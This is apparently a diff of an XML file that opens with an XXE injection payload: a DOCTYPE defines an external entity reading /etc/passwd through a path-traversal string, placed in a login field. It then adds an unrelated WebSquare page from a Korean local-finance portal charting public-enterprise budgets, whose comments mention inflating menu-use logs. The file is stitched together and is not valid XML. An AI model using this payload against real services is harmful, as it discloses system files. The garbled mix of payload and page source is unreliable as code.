@@ -1,7 +1,630 @@
+
+<?xml version="1.0" encoding="UTF-8"?>
+
+
+
 <!DOCTYPE XXE [
 
-<!ENTITY XXE SYSTEM "file:///etc/passwd">
+<!ENTITY XXE SYSTEM "file:///../../../../../../etc/passwd">
 
 ]>
 
 <reset><login>&XXE;</login><secret>Any bugs?</secret>
+
+
+<?xml-stylesheet href="/css/lofin/layout.css" type="text/css"?>
+<html xmlns="http://www.w3.org/1999/xhtml"
+    xmlns:ev="http://www.w3.org/2001/xml-events"
+    xmlns:w2="http://www.inswave.com/websquare" xmlns:xf="http://www.w3.org/2002/xforms">
+    <head>
+    	<w2:type>DEFAULT</w2:type>
+        <w2:buildDate/>
+        <xf:model>
+        	<xf:instance>
+        		<data xmlns="" />
+        	</xf:instance>
+
+        	<w2:dataCollection>
+
+        		<w2:dataList id="dl_mainChart">
+        			<w2:columnInfo>
+        				<w2:column id="label" name="라벨" dataType="text"></w2:column>
+        				<w2:column id="value" name="수치" dataType="text"></w2:column>
+        				<w2:column id="link" name="차트이벤트" dataType="text"></w2:column>
+        				<w2:column id="linkValue01" name="지방공기업코드" dataType="text"></w2:column>
+        				<w2:column id="linkValue02" name="지방공기업명" dataType="text"></w2:column>
+        				<w2:column id="linkValue03" name="분류코드" dataType="text"></w2:column>
+        			</w2:columnInfo>
+        		</w2:dataList>
+
+        		<w2:dataList id="dl_subChart01">
+        			<w2:columnInfo>
+        				<w2:column id="label" name="라벨" dataType="text"></w2:column>
+        				<w2:column id="value" name="수치" dataType="text"></w2:column>
+        			</w2:columnInfo>
+        		</w2:dataList>
+				<w2:dataList id="dl_subChart02" style="">
+        			<w2:columnInfo>
+        				<w2:column dataType="text" id="label" name="라벨"></w2:column>
+        				<w2:column dataType="text" id="value" name="수치"></w2:column>
+        			</w2:columnInfo>
+        		</w2:dataList>
+        		<w2:dataList id="dl_year">
+        			<w2:columnInfo>
+        				<w2:column id="label" name="연도" dataType="text"></w2:column>
+        				<w2:column id="value" name="연도" dataType="text"></w2:column>
+        			</w2:columnInfo>
+        		</w2:dataList>
+
+        		<w2:dataMap id="dm_search">
+        			<w2:keyInfo>
+        				<w2:key id="year" name="연도" dataType="text"></w2:key>
+        				<w2:key id="linkFnNm" name="링크함수명" dataType="text"></w2:key>
+        				<w2:key id="linkKey" name="시도키값" dataType="text"></w2:key>
+        				<w2:key id="linkKeyNm" name="시도명" dataType="text"></w2:key>
+        				<w2:key id="gbn01" name="TOP10구분(HR:상위TOP10, LR:하위TOP10)" dataType="text"></w2:key>
+        				<w2:key id="gbn04" name="분류코드값" dataType="text"></w2:key>
+        				<w2:key id="gbn05" name="구분코드값" dataType="text"></w2:key>
+        			</w2:keyInfo>
+        		</w2:dataMap>
+
+        		<w2:dataMap id="dm_result">
+        			<w2:keyInfo>
+        				<w2:key id="minLineVal" name="라인차트 Min값" dataType="text"></w2:key>
+        				<w2:key id="maxLineVal" name="라인차트 Max값" dataType="text"></w2:key>
+        			</w2:keyInfo>
+        		</w2:dataMap>
+        		<w2:dataList id="dm_gubun" baseNode="list" saveRemovedData="true" repeatNode="map">
+        			<w2:columnInfo>
+        				<w2:column id="value" name="구분코드" dataType="text"></w2:column>
+        				<w2:column id="label" name="구분명" dataType="text"></w2:column>
+        			</w2:columnInfo>
+        		</w2:dataList>
+        		<w2:dataList id="dm_gubunDetail" baseNode="list" saveRemovedData="true" repeatNode="map">
+        			<w2:columnInfo>
+        				<w2:column id="label" name="name1" dataType="text"></w2:column>
+        				<w2:column id="value" name="name2" dataType="text"></w2:column>
+        			</w2:columnInfo>
+        		</w2:dataList>
+        		<w2:dataList id="dl_subGrid01" baseNode="list" saveRemovedData="true" repeatNode="map">
+        			<w2:columnInfo>
+        				<w2:column id="label" name="기관명" dataType="text"></w2:column>
+        				<w2:column id="value" name="예산" dataType="number"></w2:column>
+        			</w2:columnInfo>
+        		</w2:dataList>
+        		<w2:dataMap id="dm_result_info">
+					<w2:keyInfo>
+						<w2:key id="key" name="키값" dataType="text"></w2:key>
+						<w2:key id="info" name="정보" dataType="text"></w2:key>
+						<w2:key id="minValue" name="정보" dataType="text"></w2:key>
+						<w2:key id="maxValue" name="정보" dataType="text"></w2:key>
+					</w2:keyInfo>
+				</w2:dataMap>
+        		
+        	</w2:dataCollection>
+
+        	<xf:submission id="getMainSelect" ref='data:json,{"id":"dm_search","key":"dfSearchInfo"}'
+        		target='data:json,[
+									  {"id":"dl_mainChart","key":"dfChartList"}
+								]'
+        		action="/portal/theme/selectSubChartLcltyPblcorp01.do" method="post" mediatype="application/json" encoding="UTF-8"
+        		mode="asynchronous" processMsg="조회중입니다..." instance="" replace="" errorHandler="" customHandler="" ev:submit="" ev:submitdone="" ev:submiterror="">
+
+        		<script type="javascript" ev:event="xforms-submit-done">
+        			<![CDATA[
+        				pFn.fn_callback(this.id, e);
+        			]]>
+        		</script>
+        		<script type="javascript" ev:event="xforms-submit-error">
+        			<![CDATA[
+        				pFn.fn_errorCallback(this.id, e);
+        			]]>
+        		</script>
+        	</xf:submission>
+
+        	<xf:submission id="getSubSelect01" ref='data:json,{"id":"dm_search","key":"dfSearchInfo"}'
+        		target='data:json,[{"id":"dl_subChart01","key":"dfChartList"},{"id":"dm_result","key":"dfResultInfo"},{"id":"dl_subGrid01","key":"dfGridList"}]'
+        		action="/portal/theme/selectSubChartLcltyPblcorp02.do" method="post" mediatype="application/json" encoding="UTF-8"
+        		mode="asynchronous" processMsg="조회중입니다..." instance="" replace="" errorHandler="" customHandler="" ev:submit="" ev:submitdone=""
+        		ev:submiterror="">
+
+        		<script type="javascript" ev:event="xforms-submit-done">
+        			<![CDATA[
+        				pFn.fn_callback(this.id, e);
+        			]]>
+        		</script>
+        		<script type="javascript" ev:event="xforms-submit-error">
+        			<![CDATA[
+        				pFn.fn_errorCallback(this.id, e);
+        			]]>
+        		</script>
+        	</xf:submission>
+
+			<xf:submission 
+				id="getSubSelect02" 
+				ref='data:json,{"id":"dm_search","key":"dfSearchInfo"}' 
+				target='data:json,[
+									 {"id":"dl_subChart02","key":"dfChartList"}
+								    ,{"id":"dm_result","key":"dfResultInfo"}
+								]'
+				action="/portal/theme/selectSubChartLcltyPblcorp03.do" 
+				method="post" 
+				mediatype="application/json" 
+				encoding="UTF-8" 
+				mode="asynchronous" 
+				singleMode="false" 
+				processMsg="조회중입니다..." 
+				instance="" 
+				replace=""
+				errorHandler="" 
+				customHandler="">
+				
+				<script type="javascript" ev:event="xforms-submit-done">
+					<![CDATA[
+        				pFn.fn_callback(this.id, e);
+        			]]>
+        		</script>
+				<script type="javascript" ev:event="xforms-submit-error">
+					<![CDATA[
+        				pFn.fn_errorCallback(this.id, e);
+        			]]>
+        		</script>
+			</xf:submission>
+        	<xf:submission id="selectGubunMenu" ref='data:json,{"id":"dm_search","key":"dfSearchInfo"}'
+        		target='data:json,{"id":"dm_gubun","key":"gubunInfo"}' action="/portal/theme/selectGubunMenuLcltyPblcorp.do" method="post"
+        		mediatype="application/json" encoding="UTF-8" instance="" replace="" errorHandler="" customHandler="" mode="asynchronous"
+        		processMsg="" ev:submit="" ev:submitdone="pFn.selectGubunMenu_submitdone" ev:submiterror="">
+        	</xf:submission>
+        	<xf:submission id="selectGubunMenuDetail" ref='data:json,{"id":"dm_search","key":"dfSearchInfo"}' target='data:json,{"id":"dm_gubunDetail","key":"gubunDetail"}' action="/portal/theme/selectGubunMenuDetailLcltyPblcorp.do" method="post" mediatype="application/json" encoding="UTF-8"
+        		instance="" replace="" errorHandler="" customHandler="" mode="asynchronous" processMsg="" ev:submit="" ev:submitdone="pFn.selectGubunMenuDetail_submitdone"
+        		ev:submiterror="">
+        	</xf:submission>
+        	
+        	<xf:submission 
+				id="getYear" 
+				ref='data:json' 
+				target='data:json,{"id":"dl_year","key":"yearInfo"}'
+				action="/portal/theme/selectYEAR027.do" 
+				method="post" 
+				mediatype="application/json" 
+				encoding="UTF-8" 
+				mode="asynchronous" 
+				processMsg="조회중입니다..." 
+				instance="" 
+				replace=""
+				errorHandler="" 
+				customHandler="" ev:submitdone="pFn.getYear_submitdone" ev:submit="" ev:submiterror="">
+			</xf:submission>
+        </xf:model>
+        <script src="/js/vslz.js" type="javascript"><![CDATA[ ]]></script> 
+        <script type="javascript">
+        	<![CDATA[ 
+        		//var menuId = WebSquare.net.getParameter( "menuId" );
+				var menuId='TMMMMM001SD006TH027_01';
+				
+				var startPage = 'true';
+        		
+				//Websquare 실행을 위한 선언
+				pFn.execSubmission = function(submissionID) {
+				
+					WebSquare.ModelUtil.executeSubmission(submissionID);
+					
+				};
+				
+				// 화면 초기 설정 - 1.년도,구분,분류 2.차트
+				pFn.onLoad = function(){				
+					// 랭크구분 설정
+					dm_search.set("gbn01", selectLank.getValue());
+					
+					// 연도 설정 
+					//pFn.setYear(10);
+					pFn.execSubmission("getYear");
+					
+					// 차트설정
+					//pFn.btn_Search_onclick();
+					
+					//그리드 캡션, 써머리 등록
+					//pFn.setGridCaption(grd_stat);
+				};
+				
+				//메인 Chart submission 실행
+				pFn.getMainChart = function(){
+				
+					// 링크 함수명 설정
+					dm_search.set("linkFnNm" , "fn_getSubChart");
+					
+					pFn.execSubmission("getMainSelect");
+				};
+				
+				//서브 Chart submission 실행
+				pFn.getSubSelect = function(keyValue, keyNm, keyCode){
+				
+					// 링크 함수명 초기화
+					dm_search.set("linkFnNm" , "");
+					
+					// 하위 차트 키값 설정
+					dm_search.set("linkKey",keyValue);
+					dm_search.set("linkKeyNm",keyNm);
+					dm_search.set("gbn05",keyCode);					
+					pFn.execSubmission("getSubSelect01");
+					pFn.execSubmission("getSubSelect02");
+				};
+				
+				//Submission 실행 성공 
+				pFn.fn_callback = function(sId,e){
+				
+					if(sId == "getMainSelect"){
+						var dataObj = {"chart":{},"data":dl_mainChart.getAllJSON()};
+						pFn.fn_CreateMainChart(dataObj);
+						
+						// 하위 차트 변경
+						pFn.getSubSelect(dl_mainChart.getCellData(0,'linkValue01'), dl_mainChart.getCellData(0,'linkValue02'), dl_mainChart.getCellData(0,'linkValue03'));
+					}
+					else if(sId == "getSubSelect01"){
+						var dataObj = {"chart":{},"data":dl_subChart01.getAllJSON()};
+						pFn.fn_CreateSubChart01(dataObj);						
+					}
+					else if(sId == "getSubSelect02"){
+						var dataObj = {"chart":{},"data":dl_subChart02.getAllJSON()};
+						pFn.fn_CreateSubChart02(dataObj);						
+					}
+					else{
+						alert("성공!!!!!");
+					}
+				};
+				
+				//Submission 실행 실패시 
+				pFn.fn_errorCallback = function(sId,e){
+					if(sId == "getSelect"){
+						alert("getSelect Error");
+					}else if(sId == "getSubSelect"){
+						alert("getSubSelect Error");
+					}else{
+						alert("Error!!!!!");
+					}
+				};
+						
+				// 메인 차트 생성
+				pFn.fn_CreateMainChart = function(dataObj){	
+					var gbn = selectLank.getValue();
+					var textCaption = "";					
+					if(gbn == "HR"){
+						textCaption =  "예산규모 상위10개 지방공기업" ;
+					}else{
+						textCaption =  "예산규모 하위10개 지방공기업" ;
+					}		
+					txt_chart1_title.setValue( textCaption );	
+					
+					
+					mainChart.setJSONData(dataObj);
+					setCmmThemOpt(mainChart, "Bar", "MIL", false,0,0);
+					var subChartOpt = {outCnvBaseFontColor : "#000000" };
+					mainChart.setChartAttribute(subChartOpt);
+					mainChart.draw();
+					$("#mainChart").find("text").eq(0).css("fill","rgb(0, 102, 204)");
+				};
+								
+				pFn.fn_CreateSubChart01 = function(dataObj){
+					txt_chart2_title.setValue( dm_search.get("linkKeyNm") + " 예산추이");	
+				
+					setCmmThemOpt(subChart01, "Line", "MIL", true, dm_result.get("minLineVal"), dm_result.get("maxLineVal"));
+					subChart01.setJSONData(dataObj);
+				
+				};
+				
+				pFn.fn_CreateSubChart02 = function(dataObj){				
+					var minValue = dm_result_info.get("minValue");
+					var maxValue = dm_result_info.get("maxValue");
+					txt_chart3_title.setValue( dm_search.get("linkKeyNm") + " 전년대비 증감률 추이" );
+					subChart02.setJSONData(dataObj);
+					
+					setCmmThemOpt(subChart02, "Column", "PER", true, minValue, maxValue );
+					var subChartOption02={rotatevalues  : "0"}
+					subChart02.setChartAttribute(subChartOption02);
+					subChart02.refresh();
+					subChart02.draw();
+				};
+				// 구분 변경이벤트
+				pFn.gubunChange = function(){
+					pFn.selectGubunMenu_submitdone();
+				};
+				
+				pFn.addMenuLogCallback = function(){	
+					//로그 뻥튀기 유지하기 위해 콜백함수로 다음 로직 위치 변경함 -> 로그 뻥튀기 제거한다면 밑에 로직 개선 전으로 위치 돌려놔야함			
+					pFn.getMainChart();
+				};
+				
+				// 검색버튼 클릭시 
+				pFn.btn_Search_onclick = function (){ 
+					var year = selectYear.getValue();	
+					var gubun = selectGubun.getValue();				
+					var guDe = selectGubunDe.getValue();
+					
+					if (gubun == "") {
+						guDe = "";
+					}
+					
+					dm_search.set( "year" , year);
+					dm_search.set( "gbn04" , gubun);
+					dm_search.set( "gbn05" , guDe);
+					
+					ajaxLib.AddMenuLog(menuId, pFn.addMenuLogCallback); //로그 뻥튀기 유지하기 위해 콜백함수 적용
+				};
+				
+				// 랭크 콤보박스 변경 이벤트		
+				pFn.lankChange = function(){ 
+					var gbn = selectLank.getValue();
+					var year = selectYear.getValue();	
+					var gubun = selectGubun.getValue();				
+					var guDe = selectGubunDe.getValue();
+					
+					dm_search.set("gbn01", gbn);
+					dm_search.set( "year" , year);
+					dm_search.set( "gbn04" , gubun);
+					dm_search.set( "gbn05" , guDe);
+					
+					// 하위 차트 조회
+					pFn.getMainChart();
+				};
+				
+				// 메인 차트 링크 함수
+				function fn_getSubChart(keyValue, keyNm, keyCode){
+					pFn.getSubSelect(keyValue, keyNm, keyCode);
+				}
+				
+				pFn.selectGubunMenu_submitdone = function(){
+					if(selectGubun.getItemCount() == 1){
+						selectGubun.hide();
+						selectGubun.hide();
+					}else{						
+						var gubun = selectGubun.getValue();
+						if(gubun == ""){
+							selectGubunDe.hide();
+						}else{
+							selectGubunDe.show("");
+							dm_search.set( "gbn04" , gubun);
+							pFn.execSubmission("selectGubunMenuDetail");
+						}
+					}
+					
+				}
+				
+				//그리드 캡션,써머리 추가
+				pFn.setGridCaption = function(obj) {
+				    var grid_obj = obj;
+				    var head_str = "";
+				    
+				    for(var i=0; i<grid_obj.getTotalCol(); i++) {
+				        if(grid_obj.getHeaderID(i) != null) {
+				            if(i > 0) head_str += ","; 
+				            head_str += grid_obj.getHeaderValue(grid_obj.getHeaderID(i)).replace(/\<br>/ig,"");
+				        }
+				    }			
+				    grid_obj.setCaption( title.getValue() + " : " + head_str );
+				    grid_obj.setSummary( title.getValue() + " : " + head_str );
+				
+				    //grid_obj.setGridReadOnly();
+				};
+			
+				// 화면 onLoad
+				pFn.onLoad();
+				
+				pFn.selectYear_onviewchange = function(info) { 
+					dm_search.set("year", selectYear.getValue());
+					
+					//구분 조회
+                    pFn.execSubmission("selectGubunMenu");
+				};
+				
+				// 년도가 끝났을때, 구분조회
+				pFn.getYear_submitdone = function(e) {
+					dm_search.set("year", selectYear.getValue());
+					
+					if(startPage){					
+						startPage = 'false';
+						pFn.btn_Search_onclick();	
+					}
+					
+                    //구분 조회
+                    pFn.execSubmission("selectGubunMenu");
+				};
+			
+				//코멘트 버튼 실행 함수
+				var commTxtBtn = true;
+			    pFn.comment_onclick = function() {
+			    	if(commTxtBtn) {
+		            	comm_txt.show();
+			    		commTxtBtn = false;
+			    	} else {
+		            	comm_txt.hide();
+			    		commTxtBtn = true;
+			    	}
+	        	};
+	        	
+	        	/* 도움말 s*/
+		        ajaxLib.commentAJAX('TMMMMM001SD006TH027_01','1');
+		
+				commentAJAXCallBack = function(result) {	
+					$("#comm_txt").append(result.data[0].menuDesc);			
+				}  		      
+		        /* 도움말 e*/
+			]]>
+		</script>
+    </head>
+	<body class="">
+		<xf:group id="" style="" class="wrap" tagname="div">
+    		<w2:wframe id="wf_head" style="position: relative;" src="/ui/portal/common/header.xml"></w2:wframe>
+    		<xf:group id="" style="" class="container">
+    			<xf:group class="content_x" id="" style="">
+    				<xf:group id="grp_subtop">
+
+    					<xf:group class="h1set" id="" style="" tagname="div">
+    						<xf:group adaptiveThreshold="" class="loca" id="" style="" tagname="div">
+    							<xf:group class="loca_home1" id="" style="" tagname="div">
+    								<w2:anchor class="loca_home_txt" href="/portal/main.do" id="" outerDiv="false">
+    									<xf:label>home</xf:label>
+    								</w2:anchor>
+    							</xf:group>
+    							<xf:group class="loca_home2" id="" style="" tagname="div">
+    								<w2:span id="" label=" &gt; " style=""></w2:span>
+    								<w2:anchor id="sub_nav1" outerDiv="false" title="알기쉬운 지방재정바로가기">
+    									<xf:label>알기쉬운지방재정</xf:label>
+    								</w2:anchor>
+    								<w2:span id="" label=" &gt; " style=""></w2:span>
+    								<w2:anchor id="sub_nav2" outerDiv="false">
+    									<xf:label>테마별시각화</xf:label>
+    								</w2:anchor>
+    							</xf:group>
+    						</xf:group>
+    					</xf:group><xf:group class="h1_tit" style="">
+    						<w2:textbox id="1" label="" tagname="h1"></w2:textbox>
+    					</xf:group><xf:group class="vs_topcont" id="" style="" tagname="div">
+    						<xf:group class="vs_tab" id="" tagname="div">
+    							<xf:group class="vs_tab_all" id="" tagname="div">
+    								<w2:anchor id="" outerDiv="false" class="vs_tab_item_select">
+    									<xf:label>처음으로</xf:label>
+    								</w2:anchor>
+    							</xf:group>
+    							<xf:group class="vs_tab_item" id="" tagname="div">
+    							</xf:group>
+    							<xf:group class="vs_tab_item" id="" tagname="div">
+    							</xf:group>
+    							<xf:group class="vs_tab_item" id="" tagname="div">
+    							</xf:group>
+    						</xf:group>
+    					<xf:group id="" style="" class="vs_comment_cont" tagname="div"><xf:group id="" class="vs_comment" tagname="div">
+    							<w2:anchor id="" outerDiv="false" ev:onclick="pFn.comment_onclick" toolTip="" title="주석보기">
+    								<xf:label>주석보기</xf:label>
+    							</w2:anchor>
+    						</xf:group><xf:group id="comm_txt" style="display:none;" class="vs_comment_txt" tagname="div">
+    						</xf:group></xf:group></xf:group>
+    					<xf:group id="grp_content">
+    						<xf:group class="sub_search_bar" id="" tagname="div">
+    							<xf:group id="" tagname="ul">
+    								<xf:group id="" tagname="li">
+    									<xf:select1 disabledClass="w2selectbox_disabled" renderType="select" appearance="minimal" direction="auto"
+    										chooseOption="false" id="selectYear" title="연도" style="position:relative;width:120px;height:21px;" displayMode="label"
+    										allOption="false" submenuSize="auto" disabled="false" ref="" emptyItem="true" ev:onviewchange="pFn.selectYear_onviewchange">
+    										<xf:choices>
+    											<xf:itemset nodeset="data:dl_year">
+    												<xf:label ref="label"></xf:label>
+    												<xf:value ref="value"></xf:value>
+    											</xf:itemset>
+    										</xf:choices>
+    									</xf:select1>
+    									<xf:select1 allOption="" appearance="minimal" chooseOption="" class="" direction="auto"
+    										disabled="false" disabledClass="w2selectbox_disabled" displayMode="label" ev:onViewChange="pFn.gubunChange" id="selectGubun"
+    										title="구분" optionOrder="false" renderType="select" style="" submenuSize="auto">
+    										<xf:choices>
+    											<xf:itemset nodeset="data:dm_gubun">
+    												<xf:label ref="label"></xf:label>
+    												<xf:value ref="value"></xf:value>
+    											</xf:itemset>
+    										</xf:choices>
+    									</xf:select1>
+    									<xf:select1 allOption="" appearance="minimal" chooseOption="" class="" direction="auto"
+    										disabled="false" disabledClass="w2selectbox_disabled" displayMode="label" ev:onViewChange="" id="selectGubunDe" title="분류"
+    										optionOrder="false" renderType="select" style="" submenuSize="auto">
+    										<xf:choices>
+    											<xf:itemset nodeset="data:dm_gubunDetail">
+    												<xf:label ref="label"></xf:label>
+    												<xf:value ref="value"></xf:value>
+    											</xf:itemset>
+    										</xf:choices>
+    									</xf:select1>
+    									<xf:trigger class="but_blue30" ev:onclick="pFn.btn_Search_onclick" id="btn_Search" style=""
+    										type="button" title="검색">
+    										<xf:label><![CDATA[검색]]></xf:label>
+    									</xf:trigger>
+    								</xf:group>
+    							</xf:group>
+    						</xf:group>
+
+    						<!--  float 정렬 후 항상  clear를 추가 -->
+    						<xf:group class="clear" id="" tagname="div"></xf:group>
+
+    						<!--  박스와박스사이여백 -->
+    						<xf:group id="" tagname="div" class="pb16"></xf:group>
+
+    						<!--  1단 그래프에는 graph_all_wrap을 추가  -->
+
+    						<!--  옆 그래프 박스와 높이맞추기 -->
+
+    						<xf:group class="vs_box_50_r" id="" style="" tagname="div">
+    							<xf:group class="vs_box_top" id="" style="" tagname="div">
+    								<xf:group class="vs_box_tit" id="" tagname="div">
+    									<w2:textbox id="txt_chart1_title" label=""></w2:textbox>
+    								</xf:group>
+    								<xf:group class="vs_box_option" id="" tagname="div">
+    									<xf:group class="vs_box_option_txt" id="" tagname="div">
+    										<w2:textbox id="" label="[단위:백만원]"></w2:textbox>
+    									</xf:group>
+    									<xf:group class="vs_box_option_select" id="" tagname="div" style="">
+    										<xf:select1 disabledClass="w2selectbox_disabled" renderType="select" appearance="minimal" direction="auto" chooseOption="false" id="selectLank" title="상하위" style="position:relative;width:100px;height:21px;" displayMode="label" allOption="false" submenuSize="auto" disabled="false" ref="" emptyItem="true" >
+    								<xf:choices>
+    									<xf:item>
+    										<xf:label><![CDATA[상위Top10]]></xf:label>
+    										<xf:value><![CDATA[HR]]></xf:value>
+    									</xf:item>
+    									<xf:item>
+    										<xf:label><![CDATA[하위Top10]]></xf:label>
+    										<xf:value><![CDATA[LR]]></xf:value>
+    									</xf:item>
+    								</xf:choices>
+    							</xf:select1>
+    							<w2:anchor href="#" class="sitesMove" ev:onclick="pFn.lankChange(document.getElementById('selectLank').value)" label="이동"></w2:anchor>
+    									</xf:group>
+    								</xf:group>
+    							</xf:group>
+    							<xf:group class="vs_box_cont" id="grp_subChart02" tagname="div">
+    								<w2:fusionchart accessibility="true" id="mainChart" chartType="Bar2D" style="position: relative;height: 380px;min-width:320px;min-width:300px;" seriesType="simple" drawType="javascript">
+    								</w2:fusionchart>
+    							</xf:group>
+    						</xf:group>
+    						<xf:group class="vs_box_50" id="" style="" tagname="div">
+    							<xf:group class="vs_box_top" id="" style="" tagname="div">
+    								<xf:group class="vs_box_tit" id="" tagname="div">
+    									<w2:textbox id="txt_chart2_title" label=""></w2:textbox>
+    								</xf:group>
+    								<xf:group class="vs_box_option" id="" tagname="div">
+    									<xf:group class="vs_box_option_txt" id="" tagname="div">
+    										<w2:textbox id="" label="[단위: 백만원]"></w2:textbox>
+    									</xf:group>
+    								</xf:group>
+    							</xf:group>
+    							<xf:group class="vs_box_cont" id="grp_subChart03" tagname="div">
+    								<w2:fusionchart accessibility="true" id="subChart01" chartType="Line" style="position: relative; height: 380px;min-width:320px;" seriesType="simple" drawType="javascript">
+    								</w2:fusionchart>
+    							</xf:group>
+    						</xf:group>
+    						<xf:group class="vs_box_100" id="" style="">
+    							<xf:group class="vs_box_top" id="" style="" tagname="div">
+    								<xf:group class="vs_box_tit" id="" tagname="div">
+    									<w2:textbox id="txt_chart3_title" label=""></w2:textbox>
+    								</xf:group>
+    								<xf:group class="vs_box_option" id="" tagname="div">
+    									<xf:group class="vs_box_option_txt" id="" tagname="div">
+    										<w2:textbox id="" label="[단위 : %]"></w2:textbox>
+    									</xf:group>
+    									<xf:group class="vs_box_option_select" id="" tagname="div">
+    									</xf:group>
+    								</xf:group>
+    							</xf:group>
+    							<xf:group id="" tagname="div" class="vs_box_cont">
+    								<w2:fusionchart accessibility="true" chartType="Column2D" drawType="javascript" id="subChart02"
+    									seriesType="simple" style="position: relative; height: 380px;min-width:320px;" dataList="dl_subGrid01">
+    								</w2:fusionchart>
+    							</xf:group>
+    						</xf:group>
+    					</xf:group>
+    					
+    				</xf:group>
+    				<w2:wframe id="wf_content" src=""></w2:wframe>
+    			</xf:group>
+			</xf:group>
+		</xf:group>
+		<!--  풋터와의 여백 -->
+		<xf:group class="mb40" id="" tagname="div"></xf:group>
+		<w2:wframe id="wf_foot" style="position: relative;" src="/ui/portal/common/footer.xml"></w2:wframe>
+	</body>
+</html>
